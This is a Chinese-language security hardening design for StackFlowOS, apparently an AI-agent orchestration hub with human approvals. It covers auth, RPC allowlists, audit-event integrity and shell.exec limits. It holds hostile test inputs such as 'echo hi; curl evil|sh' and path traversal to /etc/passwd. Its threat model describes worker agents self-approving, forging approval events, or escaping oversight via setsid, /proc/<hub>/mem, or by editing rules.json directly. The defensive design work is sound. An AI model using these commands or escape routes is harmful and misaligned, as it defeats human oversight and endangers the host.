> 为什么需要“自定义头 + Origin”而不是只靠 SameSite？SameSite=Strict 已经能挡大多数跨站 Cookie，但：(a) 老浏览器/非浏览器客户端；(b) 同站不同源的子域/端口；(c) 未来若加子域。四层叠加，任何一层失效仍有保护。

#### 5.1.5 安全响应头

静态 HTML 与 API 响应统一加：

| 头 | 值 | 目的 |
|---|---|---|
| `Content-Security-Policy` | `default-src 'self'; script-src 'self'; style-src 'self'; img-src 'self' data:; connect-src 'self'; frame-ancestors 'none'; base-uri 'none'; form-action 'none'; object-src 'none'` | XSS 兜底 + 禁止被 iframe |
| `X-Frame-Options` | `DENY` | 老浏览器点击劫持 |
| `X-Content-Type-Options` | `nosniff` | MIME 混淆 |
| `Referrer-Policy` | `no-referrer` | 防止 URL/token 泄漏到外部 |
| `Cross-Origin-Opener-Policy` | `same-origin` | 隔离窗口 |
| `Cross-Origin-Resource-Policy` | `same-origin` | 禁止跨源嵌入 |
| `Cache-Control` | API/SSE `no-store`；静态 `no-cache` | 不缓存敏感响应 |
| `Permissions-Policy` | `camera=(), microphone=(), geolocation=()` | 最小能力 |

> 前端当前 `index.html` 只有一个 `<script type="module" src="/js/main.js">`，没有 inline script；CSS 外链。上述 CSP 不需要 `unsafe-inline`。若后续加入 inline JSON，必须用 `<script type="application/json">` + 转义 `<`→`\u003c`，不能用字符串拼 `<script>`（DSH 的 `injections.ts` 也做 `\u003c` 转义）。

#### 5.1.6 CLI 与本地控制面（Pi 的“零端口”思路）

问题：如果 token 写进 `.stackflowos/run/web.token` 或启动日志，worker 的 shell（同用户）能读，等于 agent 能自审批。DSH 也没解决同用户问题（密钥 0600 同用户可读），但 StackFlowOS 可以做得更好：

1. hub 在 `run/control.sock` 上开一个**Unix domain socket**（0600），只处理：
   - `GET /url`：返回启动 URL（含 token）；
   - `GET /status`：等价 `/api/health`/`/api/state` 摘要；
   - `POST /shutdown`：可选（需二次确认）。
2. 服务端用 `SO_PEERCRED` 取 `pid/uid/gid`：
   - `uid != hub uid` → 拒绝；
   - 若 peer pid 是任意 worker pid 的后代（读 `/proc/<pid>/stat` 的 ppid 链，最多 64 层）→ 拒绝（防止 agent shell 里执行 `sfo url`）；
   - `/proc` 不可用（非 Linux）→ 退化为“只允许 TTY 且 `SFO_WEB_TOKEN` 未设置”的显式 `sfo url --print`，并在文档写明。
3. `sfo url` / `sfo status` 优先走 control socket；`sfo status --token` 仍可用于远程/调试。
4. `sfo hub` 在 TTY 打印 URL；非 TTY 不打印、不写日志；用户用 `sfo url` 取。

**残余风险**：worker 可以 `setsid`/double-fork 脱离祖先链，或直接读 `/proc/<hub>/mem`（同用户 ptrace 限制另说）。这属于“同用户进程”威胁，无法在应用层彻底解决；Phase 5 用独立用户/沙箱解决。方案会在 README 的“已知限制”中写明。

#### 5.1.7 SSE（H2）

```python
# 删除
# "Access-Control-Allow-Origin: *\r\n"
# 改为
"Cache-Control: no-cache, no-store\r\n"
"X-Content-Type-Options: nosniff\r\n"
"Content-Type: text/event-stream; charset=utf-8\r\n"
```

- 认证：与 API 相同（Cookie 或 Bearer）；未认证直接 401，不建立流。
- `since`/`limit`/`heartbeat`：严格解析；`heartbeat` 缺省 `web.sse_heartbeat_s`，范围 `[1, 300]`，`0`/负数/NaN/Inf → 400；`since` 必须 `>=0`；`limit` 范围 `[1, 1000]`。
- `since` 回放：限制最多 1000 条；老事件用 EventLog 文件回放（§6.10）。
- 并发上限：`web.sse_max_clients`（默认 32）；超过返回 503 + 明确错误，防止 fd/内存耗尽。
- 慢消费者：保留 `_broadcast` 的“丢最旧”策略；SSE 端写失败立即清理订阅。
- 事件脱敏：审批事件里 `request` 字段包含 preview；SSE 发给 UI 的预览按 §6.17 的截断/脱敏规则；不要在事件里放完整文件内容。

#### 5.1.8 前端改动

| 文件 | 改动 |
|---|---|
| `webassets/js/api.js` | 统一 `requestJson`：同源 `credentials: 'same-origin'`；非 GET 加 `X-SFO-Request: 1`、`Content-Type: application/json`；401 时显示“请用启动 URL 重新登录”，不自动重试。 |
| `webassets/js/store.js` | `EventSource` 同源即可（Cookie 自动带）；移除任何 `?token=` 拼接；断线仍有 `since` 续传。 |
| `webassets/index.html` | 不加 token；CSP 兼容（无 inline script）。 |
| `webassets/js/apps.js` | 审批卡片：显示 `preview_truncated` 标记与“查看完整内容”；内容用 `textContent` 渲染，禁止 `innerHTML`。 |
| 新增 `webassets/js/auth.js`（可选） | 处理 401/403 统一提示；不存储 token。 |

#### 5.1.9 X1：operator/chat 链（合并后必须一起修）

本地 `main` 的 `session/chat.py` 会把“批准/拒绝/打开路径/改成可写”解析成 `operator_tool` 调用，`session/operator.py` 直接执行、不进审批队列。Web 未认证时，这是**最严重的链**：任意网页 `POST /api/chat {"text":"打开 /home/user/.ssh 这个项目"}`，再“改成可写”，再派 agent，即可读写宿主任意目录。

修复：

- H1 的 admission 覆盖 `/api/chat`；未认证不可达。
- `operator` 只允许从“已认证的 web 会话”或 hub 内部调用；不暴露 RPC `chat.send` 给 worker（`chat.send` 加入 operator-only）。
- `project.attach` 仍要求显式路径 + 二次确认（UI 输入项目名/路径）；`project.access` 切可写要求二次确认；`approval.decide` 只从已认证 UI/operator 调用。
- 在 `operator.action` 审计里记录 `auth_subject`（web session id/ operator），不只记录工具参数。
- 增加测试：未认证 `/api/chat` → 401；认证后 attach 需要确认；worker RPC 不能 `chat.send`。

#### 5.1.10 代码落点

| 文件 | 改动 |
|---|---|
| `web/auth.py`（新增） | `WebAuth`：token 生成、HMAC cookie、authority 解析、constant-time 比较、过期；`Admission` 规则。 |
| `web/server.py` | 路由前 admission；删除 SSE ACAO；安全头；请求行/头/体上限；错误统一；control socket 启动/停止。 |
| `web/api.py` | `handle` 接收 `auth_context`；统一输入校验；通用 500；错误码。 |
| `config.py` | `web.auth`/`web.cookie_ttl_days`/`web.trusted_hosts`/`web.sse_max_clients`/`web.allow_remote`/`web.tls_cert`/`web.tls_key`。 |
| `cli.py` | `sfo url`/`sfo status` 走 control socket；`sfo hub` TTY 打印 URL；不再 `--host` 直接放行 wildcard。 |
| `webassets/js/*` | 见 §5.1.8。 |
| `tests/test_web_security.py`（新增） | 见 §8。 |

#### 5.1.11 验收标准（H1/H2/X1）

- [ ] 无 Cookie/Bearer 的 `/api/state`、`/api/events`、`/api/events/stream`、`/api/approvals/*/decide` → 401；
- [ ] 跨站 `Origin` / `Sec-Fetch-Site: cross-site` → 403；
- [ ] `Host: evil.example` → 403（DNS rebinding）；
- [ ] `Content-Type: text/plain` 的 POST → 415（即使 body 是合法 JSON）；
- [ ] 缺 `X-SFO-Request: 1` 的 POST → 403；
- [ ] `OPTIONS` → 405 且无 `Access-Control-*`；
- [ ] HTML/API 响应含 CSP、XFO、nosniff、Referrer-Policy；
- [ ] SSE 响应无 `Access-Control-Allow-Origin`；
- [ ] `?token=` 只接受 `GET /`、单个 token、正确 authority；错误 token → 401；成功后 303 + HttpOnly/SameSite=Strict Cookie；
- [ ] 未认证 `/api/chat` → 401；认证后 operator 的高危操作需二次确认；
- [ ] 测试用 `Authorization: Bearer` 可访问 API（不依赖 Cookie）。

---

### 5.2 H3/M5/M6/X2：RPC 身份、授权与跨项目隔离

#### 5.2.1 现状

`b5efb32` 已经做了两件事：

- `handle_rpc_action(..., external=True)`：传输层来的调用一律标记 external，5 个 `PRIVILEGED_ACTIONS` 被拒绝（即使 `src="operator"`）；
- `_bind_principal(claimed, src)`：`approval.request` 的 principal 与 `_agent_for_unit(src)` 对齐。

但这不够：

1. `src` 仍是 `Envelope.src`，对端自报；`external=True` 只保护 5 个动作。
2. `_bind_principal` 用 `_agent_for_unit(src)`，攻击者把 `src` 设成别的 unit → 绑定到别的 agent。
3. `project.delete`、`project.archive`、`agent.kill`、`unit.kill`、`project.update`、`event.append`、`approval.use`、`lease.*`、`unit.release` 不在特权集合。
4. `lease.acquire` 的 `holder`、`unit.release` 的 `work_id` 来自请求体；`task.*` 的 `task_id` 可跨项目；`event.append` 的 `type/source` 任意。
5. `WebAPI` 直接调用 `app.*`（in-process），这条路必须与 RPC 用同一套授权语义（至少 `human:operator` 通过 Web 认证）。
6. `units/worker.py` 通过 `UnitTransport.publish` 直接向 hub 的事件 PUB 端点发事件；PUB 没有认证，任何本机进程都能伪造 `approval.decided` 等审计事件（X2）。

#### 5.2.2 目标

- **身份**：hub 从连接凭证推导 principal，`src` 不再参与授权；
- **动作**：worker 只能调用白名单动作；高危动作 operator-only；
- **范围**：worker 只能操作自己项目/自己的 unit/task/agent；
- **审计**：事件 source/type 由 hub 赋值，worker 不能伪造审计类型；
- **兼容**：v2 协议；v1 外部客户端明确拒绝；同仓库 worker/hub 一起升级。

#### 5.2.3 协议 v2：`Envelope.auth`

```python
@dataclass(slots=True)
class Envelope:
    ...
    auth: dict | None = None   # 新增；v2 必填（外部 RPC）
```

- `PROTOCOL_VERSION = 2`。
- `to_dict()` 带 `auth`；`from_dict()` 读 `auth`（dict 或 None）。
- 外部 RPC 必须是 `v=2` 且 `auth` 有效；否则 `UNAUTHORIZED`。
- in-process 调用不经过 transport，直接传 `principal`，不需要 auth。

`auth` 形状：

```json
{"kind": "unit", "id": "coder.3", "token": "<base64url>"}
{"kind": "operator", "id": "web-<session>", "token": "<base64url>"}
```

建议用 `sha256(token)` 存储、`hmac.compare_digest` 比较；token 32 字节随机。

#### 5.2.4 身份生命周期

```
supervisor.spawn(role, project)
  ├─ hub 内部 unit.allocate(kind, project_id, role)  ← 只允许 in-process
  │    ├─ work_id = allocator.new_work_id(kind)
  │    ├─ unit_token = secrets.token_urlsafe(32)
  │    ├─ auth_registry.put(work_id, sha256(token), project_id, role)
  │    └─ return work_id, addresses, token
  ├─ supervisor 用 env 传给孩子：
  │    SFO_UNIT_ID=<work_id>
  │    SFO_UNIT_TOKEN=<token>
  │    SFO_SYS_RPC=<address>
  └─ worker 启动后用 unit.addresses / unit.register 带 auth

worker 死亡/unit.release
  └─ auth_registry.revoke(work_id)（token 立即失效）
```

- `unit.allocate` 加入 operator-only（外部调用拒绝）；worker 只调用 `unit.addresses`/`unit.register`。
- `auth_registry` 只存 hash；不落盘；hub 重启后 worker 重启、重新发 token。
- `ToolExecutor._shell_env()` 目前丢弃 `SFO_*`；保留，并进一步改成 allowlist（§5.3），避免 shell 子进程拿到 token。
- 外部 `attach` 设备：由 operator 通过 `sfo attach --token` 生成一次性 attach token（可选，Phase 5）；默认只支持本机 supervisor 管理。

#### 5.2.5 动作白名单

在 `app.py` 用集中表替代 `PRIVILEGED_ACTIONS` 的“黑名单式特权检查”：

```python
@dataclass(frozen=True)
class ActionRule:
    principals: frozenset[str]      # {"sys","operator","unit-lead","unit-worker"}
    scope: str = "none"             # none|own_project|own_unit|own_task|own_agent|own_grant

ACTION_RULES = {
    # 基础/自身
    "sys.ping":                 ActionRule({"sys", "operator", "unit-lead", "unit-worker"}),
    "unit.addresses":           ActionRule({"sys", "unit-lead", "unit-worker"}, "own_unit"),
    "unit.allocate":            ActionRule({"sys", "operator"}),          # 只允许 in-process
    "unit.register":            ActionRule({"sys", "unit-lead", "unit-worker"}, "own_unit"),
    "unit.heartbeat":           ActionRule({"sys", "unit-lead", "unit-worker"}, "own_unit"),
    "unit.release":             ActionRule({"sys", "unit-lead", "unit-worker"}, "own_unit"),
    # 项目/任务
    "task.list":                ActionRule({"sys", "operator", "unit-lead", "unit-worker"}, "own_project"),
    "task.get":                 ActionRule({"sys", "operator", "unit-lead", "unit-worker"}, "own_project"),
    "task.claim":               ActionRule({"unit-lead", "unit-worker"}, "own_project"),
    "task.update":              ActionRule({"unit-lead", "unit-worker"}, "own_project"),
    "task.artifact":            ActionRule({"unit-lead", "unit-worker"}, "own_project"),
    "task.note":                ActionRule({"unit-lead", "unit-worker"}, "own_project"),
    "task.check":               ActionRule({"unit-lead", "unit-worker"}, "own_project"),
    "task.create":              ActionRule({"unit-lead"}, "own_project"),
    "project.get":              ActionRule({"operator", "unit-lead", "unit-worker"}, "own_project"),
    "project.update":           ActionRule({"operator", "unit-lead", "unit-worker"}, "own_project"),  # 见下方字段白名单
    "project.archive":          ActionRule({"operator", "unit-lead"}, "own_project"),
    # agent
    "agent.register":           ActionRule({"sys", "unit-lead", "unit-worker"}, "own_unit"),
    "agent.update":             ActionRule({"unit-lead", "unit-worker"}, "own_unit"),
    "agent.finish":             ActionRule({"unit-lead", "unit-worker"}, "own_unit"),
    "agent.spawn":              ActionRule({"unit-lead"}, "own_project"),
    "agent.kill":               ActionRule({"unit-lead"}, "own_project"),   # 只能杀同项目
    "agent.list":               ActionRule({"unit-lead", "unit-worker"}, "own_project"),
    # 事件 / 审批 / 记忆 / 单元
    "event.append":             ActionRule({"unit-lead", "unit-worker"}, "own_project"),
    "event.since":              ActionRule({"unit-lead", "unit-worker"}, "own_project"),
    "unit.list":                ActionRule({"operator", "unit-lead", "unit-worker"}, "own_project"),
    "approval.request":         ActionRule({"unit-lead", "unit-worker"}, "own_project"),
    "approval.status":          ActionRule({"unit-lead", "unit-worker"}, "own_grant"),
    "approval.use":             ActionRule({"unit-lead", "unit-worker"}, "own_grant"),
    "memory.get":               ActionRule({"unit-lead", "unit-worker"}, "own_project"),
    "memory.set":               ActionRule({"unit-lead", "unit-worker"}, "own_project"),
    # operator-only
    "sys.config.get":           ActionRule({"operator"}),
    "sys.config.set":           ActionRule({"operator"}),
    "rule.*":                   ActionRule({"operator"}),
    "approval.decide":          ActionRule({"operator"}),
    "approval.list":            ActionRule({"operator"}),
    "project.create":           ActionRule({"operator"}),
    "project.list":             ActionRule({"operator"}),
    "project.delete":           ActionRule({"operator"}),
    "unit.kill":                ActionRule({"operator"}),
    "lease.*":                  ActionRule({"operator"}),
    "chat.send":                ActionRule({"operator"}),
}
```

说明：

- `sys` 是 hub 内部（in-process）调用，不等于 RPC 里的 `src="sys.0"`；外部 RPC 永远不能是 `sys`。
- `unit-lead`/`unit-worker` 由 `auth_registry` 中的 role 决定，不由 `data.role` 决定。
- `own_project`：先解析资源（task/agent/event/memory/project/unit），比较 `project_id`；不能解析就拒绝。`unit.list` 在 unit 视角下由 hub 过滤为“自己项目 + sys”，不返回全局列表。
- `own_grant`：`approval.status/use` 只允许请求的 principal 或 grant 的 owner；operator 例外。
- `project.update` 对 unit 只允许 `brief`（以及 lead 可改 `degraded` 之外的展示字段）；`status`/`name`/`goal`/`tags`/`color` 由 operator 改；字段白名单在 handler 里再次校验。
- `project.archive` 只允许 lead 归档自己的项目；operator 可归档任意项目。
- 未列出的动作默认拒绝（allowlist）。
- `rule.*` 是通配写法；实现时展开为 `rule.create/update/delete/list`。

**实现落点**：`app.py` 新增 `_authorize(principal, action, data)`，在 `handle_rpc_action` 与 Web API 的 operator 路径调用；`WebAPI` 的写操作最终也要经过 `app` 的 operator 授权（`human:operator`），而不是直接 `policy.add_rule`。

#### 5.2.6 资源范围校验

| 动作 | 校验 |
|---|---|
| `task.*` | `task.project_id == principal.project_id`；`task.claim` 的 `agent_id` 必须等于 principal 绑定的 agent；worker 只能操作自己的 `principal.task_id`（claim/update/artifact/note/check），lead 可操作项目内任意任务；`task.create` 仅 lead；`task.update` 禁止把 task 移出项目 |
| `agent.kill` | target agent 存在且 `target.project_id == principal.project_id`；lead 不能杀自己；worker 不能杀 |
| `agent.spawn` | `project_id == principal.project_id`；role 在 `TASK_ROLES`；受 `max_workers` 限制 |
| `event.append` | `project_id` 强制为 principal.project_id（没有项目则 None）；`type` 白名单；`source` 强制为 `agent:<id>` 或 `unit:<work_id>` |
| `event.since` | 强制 `project_id=principal.project_id`（忽略/拒绝其他值） |
| `memory.*` | `project_id == principal.project_id` |
| `approval.request` | principal=绑定值；`project_id` 绑定；`task_id` 属于该 project；scope 校验（路径在 workspace、URL 合法、命令非空） |
| `approval.use` | grant 的 scope/principal 与请求匹配；只允许 owner |
| `lease.*` | worker 一律拒绝；operator 才可；如未来需要 task lease，只允许 `task:<own_task>` |
| `unit.release` | 只能 release 自己的 work_id；忽略 body 里的 work_id |
| `project.update` | unit 只能改自己项目的 `brief`（字段白名单）；`status/name/goal/tags/color` 仅 operator；operator 可改任意项目 |
| `project.archive` | lead 可归档自己的项目；operator 可归档任意；worker 拒绝 |
| `project.delete` | operator-only；删除必须 `confirm` 且不是工具自动填 |
| `project.get` | unit 只能读自己的项目；operator 任意 |
| `unit.list` | unit 视角只返回“自己项目 + sys”；operator 全局 |
| `chat.send` | operator-only |

#### 5.2.7 事件通道（X2）

现状：

- worker 启动后 `unit.publish(EventRecord(...))` 直接连 hub 的 PUB 端点；`hub._on_unit_event` 无条件 `append_record`；`source` 由事件自带。
- 任何本机进程都可以 `PUB connect ipc://.../sys.0.events.sock`，发 `{"type":"approval.decided",...}`，污染审计。

修复：

1. **停用 worker→hub 的 PUB 发布**：worker 的 `on_pause`/`agent.registered`/runner 事件全部改走 `event.append` RPC（带 unit token）。
2. `event.append` 在 hub 侧：
   - `source` 强制为 `agent:<agent_id>` 或 `unit:<work_id>`；
   - `type` 白名单：`agent.step`、`agent.working`、`agent.waiting`、`agent.failed`、`agent.finished`、`agent.registered`、`task.review`、`task.blocked`、`tool.invoked`、`tool.result`、`tool.failed`、`tool.denied`、`unit.paused`；其他类型拒绝；
   - 禁止 `approval.*`、`rule.*`、`project.deleted`、`operator.*`、`sys.*`；
   - `project_id` 绑定 principal；
   - 事件 data 大小上限（如 64KB），超限拒绝/截断。
3. 如果暂时不能停 PUB（兼容期）：
   - hub 把 events 监听改成一个**只允许 hub 自己**的 in-process 通道；外部 publisher 连接直接拒绝（pynng PUB 没有 auth，可选方案是换成 REP `event.append`；PUB 只保留 hub→UI 的 fanout）。
   - 或在事件里加 HMAC，但需要 per-unit key，复杂且易错；推荐直接退役外部发布。

**决策**：退役 worker→hub PUB，统一 `event.append`。这会改变 worker 事件延迟（RPC 往返），但 worker 事件量低；`chat.delta` 等高频流仍在 hub 内部，不受影响。

#### 5.2.8 审批 principal 与 one-shot

- `approval.request` 的 `principal` 完全由连接 principal 决定；删除 `data.get("principal")`。
- `approval.status/use` 只允许 owner；`approval.decide` operator-only。
- `once`：在 `request()` 里原子消费（现有 `_spend_one_shot`），并增加 `claim_id`：
  - 建议把“消费”和“执行”绑定：`request()` 返回 `claim_id`；worker 执行前调用 `approval.claim(claim_id)`（或在 request 返回时即 claim）；执行后 `approval.use` 仅记审计。
  - 如果保留“request 时消费”，要保证 `evaluate + consume` 在同一个锁内；目前 `evaluate` 与 `_spend_one_shot` 是两次锁，存在 TOCTOU（结果是 fail-closed，但会误报）。
- `session`/`always` 规则：见 D2，移除自动泛化；只允许设置页创建。

#### 5.2.9 RPC 缓存与重试

`_make_env_handler` 的缓存 key 是 `f"{env.src}|{env.id}"`；`src` 可伪造，缓存可能串。改为 `f"{principal.kind}:{principal.id}|{env.id}"`，并在认证后计算。重试语义不变（同一 envelope id 幂等）。

#### 5.2.10 代码落点

| 文件 | 改动 |
|---|---|
| `protocol.py` | `auth` 字段；`PROTOCOL_VERSION=2`；序列化/反序列化；拒绝未知版本。 |
| `transport/nng.py` | `RpcClient` 接收 `auth`；`HubTransport`/`RpcServer` 把 `env.auth` 传给 handler；`handle_rpc_action(..., principal=)`；错误映射 401。 |
| `app.py` | `ActionRule`/`_authorize`；`handle_rpc_action` 签名；`_bind_principal` 删除；各 handler 用 principal 而不是 `src`；`unit.allocate` 只允许 in-process；`event.append` 白名单；`_on_unit_event` 只接受 hub 内部 publisher。 |
| `units/worker.py` | 从 env 读 `SFO_UNIT_ID/TOKEN`；`UnitTransport` 带 auth；事件走 `event.append`；不再 `publish` 到 hub。 |
| `agents/supervisor.py` | spawn 时传 token；revoke；日志清理。 |
| `security/approvals.py` | principal/owner 校验；原子 claim；scope fingerprint。 |
| `config.py` | `transport.allow_remote`/`transport.token`（Phase 5）；拒绝 wildcard。 |

#### 5.2.11 验收标准（H3/M5/M6/X2）

- [ ] 无 token / 错误 token / v1 envelope 的 RPC → 401；
- [ ] unit A 以 unit B 的 `src` 调用任何动作 → 仍按 A 的 principal 判权，不能越权；
- [ ] unit 调 `project.delete`/`agent.kill`（跨项目）/`unit.kill`/`sys.config.set`/`rule.*`/`approval.decide` → 403；
- [ ] unit 调 `task.update` 改别的项目任务 → 403；`agent.kill` 杀别的项目 agent → 403；
- [ ] `event.append` 伪造 `approval.decided`/`rule.created`/`project.deleted` → 403；
- [ ] `lease.release`/`unit.release` 指定别人的 holder/work_id → 403/404；
- [ ] `approval.request` 冒用 principal → 403；
- [ ] 外部 PUB 连接无法写入 hub 事件日志；
- [ ] 正常 worker 流程（任务/审批/事件/记忆）不受影响；
- [ ] Web operator 路径仍可决定审批/建规则（已认证）。

**Phase 1–4 的残余风险（必须写进文档）**：hub 侧授权只能阻止 worker **通过 RPC** 做越权动作（删项目、杀单元、决定审批、跨项目改任务）。一个已经拿到 shell 的 worker 仍然可以：

- 直接读写同一 OS 用户可访问的文件（包括 `.stackflowos/state/*`、项目 workspace、日志）；
- 直接改 `projects.json` / `rules.json` / `approvals.json`，绕过 RPC；
- 直接向 hub 进程发信号/占用端口（DoS）。

这不是本阶段能解决的：真正的边界是 Phase 5 的 OS 沙箱 + 独立用户。因此：

1. `shell.exec` 永远保持 high risk，不因规则允许而变成无审批；
2. `fs.*` 的路径检查只用于防误操作，不宣称是安全边界；
3. README 的“已知限制”明确写“同用户进程可完全控制”；
4. 生产部署建议：hub 与 worker 使用独立用户/容器；不要把无关敏感文件放在同一用户可读路径。

---

### 5.3 H4：shell.exec 加固

#### 5.3.1 现状

```python
proc = await asyncio.create_subprocess_shell(command, stdout=PIPE, stderr=PIPE, ...)
try:
    stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=timeout_s)
except asyncio.TimeoutError:
    proc.kill()              # 只杀 shell
    stdout, stderr = await proc.communicate()   # 无超时；孙子进程持管道 → 永久挂死
```

- `communicate()` 会把全部输出读进内存，`OUTPUT_CAP_BYTES=20KB` 只是读完后切片；
- `timeout_s` 无上限，`NaN`/`Infinity` 未处理；
- 日志文件名只用毫秒时间戳，`stdout` 未脱敏；
- `proc.kill()` 杀的是 shell，不是进程组；`sh -c 'sleep 100 & wait'` 之类的孙子进程仍占着 stdout 管道 → 第二次 `communicate()` 不返回。

#### 5.3.2 修复设计

```python
_MAX_TIMEOUT = 600.0
proc = await asyncio.create_subprocess_shell(
    command, cwd=str(cwd), stdin=DEVNULL, stdout=PIPE, stderr=PIPE,
    env=self._shell_env(), start_new_session=True,   # setsid → 进程组
)
out_reader = _CappedStream(proc.stdout, cap=OUTPUT_CAP_BYTES, log=log_handle, stream="stdout")
err_reader = _CappedStream(proc.stderr, cap=OUTPUT_CAP_BYTES, log=log_handle, stream="stderr")
try:
    await asyncio.wait_for(asyncio.gather(out_reader.pump(), err_reader.pump()), timeout=timeout_s)
    await asyncio.wait_for(proc.wait(), timeout=5)
except asyncio.TimeoutError:
    timed_out = True
    _terminate_group(proc.pid)          # SIGTERM group
    try:
        await asyncio.wait_for(proc.wait(), timeout=3)
    except asyncio.TimeoutError:
        _kill_group(proc.pid)           # SIGKILL group
        await asyncio.wait_for(proc.wait(), timeout=5)
    # 取消 pump；关闭管道；不再无界 communicate()
    ...
```

关键点：

1. **进程组**：`start_new_session=True`，超时用 `os.killpg(os.getpgid(pid), SIGTERM)`，3 秒后 `SIGKILL`；若 `killpg` 失败（进程已退出/权限），回退 `proc.kill()`。
2. **有界输出**：pump 逐块读（64KB），内存只保留首/尾各 `OUTPUT_CAP_BYTES`（或只保留尾部），完整输出流式写 `.artifacts/shell-<id>.log`（0600，上限 `shell_log_max_bytes=64MB`）；`truncated` 标记；不要让 `communicate()` 把无界数据读进内存。
3. **二次超时**：kill 后的 `wait()` 和 pump 的 `gather` 都加短超时；极端情况（内核 D 状态、不可杀进程）放弃管道、记录 `timed_out=True, kill_failed=True`，继续返回，绝不永久挂住 worker。
4. **取消**：`CancelledError` 同样 kill 进程组并可重抛；确保 `finally` 关闭 log handle。
5. **参数**：
   - `_arg_float` 拒绝 `NaN`/`Inf`（`math.isfinite`）；
   - `timeout_s` 上限 `min(config.shell_max_timeout_s, 600)`；`<=0` 用默认；
   - `_arg_int` 同样拒绝非有限 float，捕获 `OverflowError`。
6. **日志**：
   - 文件名 `shell-{time_ns}-{token_hex(4)}.log`；`os.open(..., O_CREAT|O_EXCL|O_WRONLY, 0o600)`；
   - 写入前对文本做 `_redact`（至少 Authorization/Bearer/API key/URL userinfo）；
   - 头信息里的 command 也 redact；
   - 超 `shell_log_max_bytes` 时截断并标记。
7. **环境**：改为 allowlist：
   ```python
   ALLOWED = {"PATH","HOME","LANG","LC_ALL","LC_CTYPE","TZ","TMPDIR","SHELL","TERM","PWD"}
   env = {k: v for k, v in os.environ.items() if k in ALLOWED or k.startswith("LC_")}
   env.update(config.shell_env_extra)  # 显式配置
   ```
   这样 `SFO_UNIT_TOKEN`、`OPENAI_API_KEY`、`SSH_AUTH_SOCK` 等默认不进 shell；与 Pi 的“shell 继承完整 env”缺口相反。
8. **命令风险**：保持 `shell.exec` high；`_is_dangerous` 增补链式/解释器模式（见 §5.4.3）；审批预览显示完整命令。

#### 5.3.3 代码落点

| 文件 | 改动 |
|---|---|
| `agents/tools.py` | `_shell_exec` 重写；`_CappedStream`/`_kill_group`；`_arg_float/_arg_int` 校验；`_shell_env` allowlist；`_write_shell_log` 唯一名/0600/redact/上限。 |
| `config.py` | `security.shell_max_timeout_s`、`security.shell_log_max_bytes`、`security.shell_env_extra`、`security.redact_shell_logs`。 |
| `tests/test_agent_tools.py` / 新增 `tests/test_shell_exec.py` | 见 §8。 |

#### 5.3.4 验收标准（H4）

- [ ] 命令 `python3 -c 'import subprocess,sys; subprocess.Popen(["sleep","30"]); print("x")'` 超时后 3 秒内返回，不留 `sleep` 进程；
- [ ] 孙子进程持有 stdout（`sh -c 'sleep 30 & echo hi'`）超时后 worker 不挂死；
- [ ] 输出 100MB 的命令不会让 worker 内存暴涨（RSS 上限测试/断言 `len(stdout)<=cap`）；
- [ ] `timeout_s=1e9` → 实际 cap；`NaN/Inf` → ToolError；
- [ ] 同一毫秒并发两次 shell → 两个不同日志文件；
- [ ] 日志权限 0600，`Authorization: Bearer` 被 redact；
- [ ] shell 环境不含 `SFO_*`/`*_TOKEN`/`SSH_AUTH_SOCK`。

---

### 5.4 M1–M4/M9/M10：策略匹配、SSRF、路径拼接、once

#### 5.4.1 M1 `url_prefix`：按 URL 结构比较，不按字符串前缀

现状：`str(scope["url"]).startswith(str(expected))`；`https://api.example.com` 匹配 `https://api.example.com.evil.io/x`。

修复：

```python
def _url_prefix_match(url: str, expected: str) -> bool:
    try:
        u, e = urlsplit(url), urlsplit(expected)
    except ValueError:
        return False
    if not u.scheme or not e.scheme:
        return False
    if u.scheme.lower() != e.scheme.lower():
        return False
    if (u.hostname or "").lower() != (e.hostname or "").lower():
        return False
    if _port(u) != _port(e):
        return False
    if u.username or u.password or e.username or e.password:
        return False
    path, prefix = u.path or "/", e.path or "/"
    return path == prefix or path.startswith(prefix.rstrip("/") + "/")
```

- 默认端口：`http=80`、`https=443`；显式端口必须相等。
- 拒绝 userinfo（`https://api.example.com@evil.io` 的 hostname 是 evil.io，本身不会匹配，但显式拒绝更清晰）。
- 可选：`expected` 允许 `*` 作为 host 通配？不建议；规则应精确。
- 文档同步：`url_prefix` 不再是“字符串前缀”，而是“同一 scheme/host/port 下的路径前缀”。

测试向量：

| url | expected | 期望 |
|---|---|---|
| `https://api.example.com/x` | `https://api.example.com` | true |
| `https://api.example.com/x/y` | `https://api.example.com/x` | true |
| `https://api.example.com.evil.io/x` | `https://api.example.com` | false |
| `https://api.example.com:8443/x` | `https://api.example.com` | false |
| `http://api.example.com/x` | `https://api.example.com` | false |
| `https://api.example.com/xevil` | `https://api.example.com/x` | false |
| `https://user:pass@api.example.com/x` | `https://api.example.com` | false |

#### 5.4.2 M2 `path_glob`：规范化后匹配，`*` 不跨目录

现状：同时匹配 `str(path)` 和 `str(raw)`；`fnmatch` 的 `*` 跨 `/`。`/ws/proj/../../etc/passwd` 未规范化也能命中 `/ws/proj/*`。

修复：

```python
def _match_path_glob(raw: str, pattern: str, cwd: str | None) -> bool:
    path = normalize_path(raw, cwd=cwd)     # resolve，去掉 ..
    pattern = str(pattern)
    if not pattern.startswith("/"):
        # 相对 pattern 建议拒绝；如要支持，锚定在 projects_root/workspace
        return False
    return re.fullmatch(_glob_to_regex(pattern), str(path)) is not None

def _glob_to_regex(pattern: str) -> str:
    # * -> [^/]* ; ** -> .* ; ? -> [^/] ; [..] -> 原样（限制）; 其他 escape
```

- 只匹配规范化后的绝对路径，**不再匹配 raw**。
- `*` 不跨 `/`；`**` 跨目录；`?` 单字符。
- 对 `..`、NUL、超长路径直接 false。
- 规则创建时校验 pattern（编译失败 → 400）。
- 旧规则迁移：`path_glob` 现在更严格，可能导致旧规则不匹配；在 UI 标记“语义已收紧，请复核”。

测试向量：

| path | pattern | 期望 |
|---|---|---|
| `/ws/proj/a` | `/ws/proj/*` | true |
| `/ws/proj/a/b` | `/ws/proj/*` | false |
| `/ws/proj/a/b` | `/ws/proj/**` | true |
| `/ws/proj/../../etc/passwd` | `/ws/proj/*` | false（规范化后 `/etc/passwd`） |
| `/ws/proj/a` | `/ws/proj/*/../*` | false（pattern 含 `..` 拒绝） |
| `/ws/proj/%2e%2e/etc` | `/ws/proj/*` | false（先 unquote 再 normalize） |

#### 5.4.3 M3 `command_regex`：全匹配 + 链式命令 + legacy 隔离

现状：`re.search`；`^echo` 放行 `echo hi; curl evil|sh`；`_always_scope` 生成 `^token(?:\s|$)`，在 `re.search` 下只匹配前缀。

修复：

